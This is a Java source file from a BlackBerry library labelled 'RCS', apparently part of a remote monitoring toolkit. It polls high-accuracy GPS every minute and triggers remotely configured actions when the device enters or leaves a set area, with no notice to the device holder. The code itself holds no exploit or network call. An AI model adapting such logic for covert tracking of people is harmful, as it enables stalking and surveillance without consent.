//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : LocationEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;
import java.io.IOException;

import javax.microedition.location.Coordinates;
import javax.microedition.location.Criteria;
import javax.microedition.location.Location;
import javax.microedition.location.LocationException;
import javax.microedition.location.LocationProvider;
import javax.microedition.location.QualifiedCoordinates;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

import net.rim.device.api.util.DataBuffer;

// TODO: Auto-generated Javadoc
/**
 * The Class LocationEvent.
 */
public final class LocationEvent extends Event {
    //#ifdef DEBUG
    private static Debug debug = new Debug("LocationEvent", DebugLevel.VERBOSE);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    int distance;
    double latitudeOrig;
    double longitudeOrig;
    Coordinates coordinatesOrig;

    LocationProvider lp;
    boolean entered = false;

    /**
     * Instantiates a new location event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public LocationEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_LOCATION, actionId, confParams);
    }

    protected void actualStart() {
        Criteria criteria = new Criteria();
        criteria.setCostAllowed(true);

        criteria.setHorizontalAccuracy(50);
        criteria.setVerticalAccuracy(50);
        criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);

        try {
            lp = LocationProvider.getInstance(criteria);
        } catch (LocationException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
        }

        entered = false;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {

        if (lp == null) {
            //#ifdef DEBUG_ERROR
            debug.error("GPS Not Supported on Device");
            //#endif               
            return;
        }

        Location loc = null;
        try {
            loc = lp.getLocation(-1);
        } catch (LocationException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
        } catch (InterruptedException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
        }

        if (loc == null) {
            //#ifdef DEBUG_ERROR
            debug.error("Error in getLocation");
            //#endif  
            return;
        }

        QualifiedCoordinates coord = null;
        try {
            coord = loc.getQualifiedCoordinates();
            coordinatesOrig = new Coordinates(latitudeOrig, longitudeOrig,
                    coord.getAltitude());

        } catch (Exception ex) {
            //#ifdef DEBUG_ERROR
            debug.error("QualifiedCoordinates: " + ex);
            //#endif
            return;

        }
        try {
            double actualDistance = coord.distance(coordinatesOrig);
            //#ifdef DEBUG_INFO
            debug.info("Distance: " + actualDistance);
            //#endif
            if (actualDistance < distance) {
                if (!entered) {
                    //#ifdef DEBUG_INFO
                    debug.info("Enter");
                    //#endif
                    trigger(actionOnEnter);
                    entered = true;
                }else{
                    //#ifdef DEBUG_TRACE
                    debug.trace("Already entered");
                    //#endif
                }
            } else {
                if (entered) {
                    //#ifdef DEBUG_INFO
                    debug.info("Exit");
                    //#endif
                    trigger(actionOnExit);
                    entered = false;
                }else{
                    //#ifdef DEBUG_TRACE
                    debug.trace("Already exited");
                    //#endif
                }
            }
        } catch (Exception ex) {
            //#ifdef DEBUG_ERROR
            debug.error("Distance: " + ex);
            //#endif
            return;
        }

    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();

            distance = databuffer.readInt();

            latitudeOrig = databuffer.readDouble();
            longitudeOrig = databuffer.readDouble();

            //#ifdef DEBUG_INFO
            debug.info("Lat: " + latitudeOrig + " Lon: " + longitudeOrig
                    + " Dist: " + distance);
            //#endif

            setPeriod(60000);
            setDelay(60000);

        } catch (final EOFException e) {
            return false;
        } catch (IOException e) {
            return false;
        }
        return true;
    }

}
